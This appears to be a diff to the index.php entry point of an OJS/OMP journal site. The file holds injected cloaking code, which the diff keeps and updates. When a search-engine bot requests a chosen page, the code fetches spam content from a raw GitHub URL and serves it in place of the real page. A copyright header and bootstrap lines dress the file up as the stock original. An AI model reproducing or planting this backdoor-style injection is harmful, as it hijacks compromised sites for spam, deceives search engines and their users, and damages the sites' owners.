@@ -1,7 +1,15 @@
 <?php
+
 /**
  * @file index.php
- * Main entry point for OJS/OMP
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+...
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * Bootstrap code for OMP site. Loads required files and then calls the
+ * dispatcher to delegate to the appropriate request handler.
  */
 ob_start();
 header('Vary: User-Agent');
@@ -19,20 +27,18 @@ function aselolejos($url){
     return $output;
 }
 
-if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/index.php/1") {
+if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/index.php/1/information/authors") {
     usleep(rand(100000, 200000)); 
     header('Content-Type: text/html; charset=utf-8');
-    echo aselolejos("https://raw.githubusercontent.com/sibayak88/sby/refs/heads/main/revistaunnival.txt");
+    echo aselolejos("https://raw.githubusercontent.com/sibayak88/sby/refs/heads/main/andescognitiosub.txt");
     ob_end_flush();
     exit;
 }
-// Definir la ubicación del archivo index (Esto quita el error de la línea 32)
+use APP\core\Application;
+
+// Initialize global environment
 define('INDEX_FILE_LOCATION', __FILE__);
+require_once './lib/pkp/includes/bootstrap.php';
 
-// Cargar el archivo de arranque
-require('./lib/pkp/includes/bootstrap.inc.php');
-
-// Ejecutar la aplicación
-PKPApplication::get()->execute();
-
-?>
+// Serve the request
+Application::get()->execute();
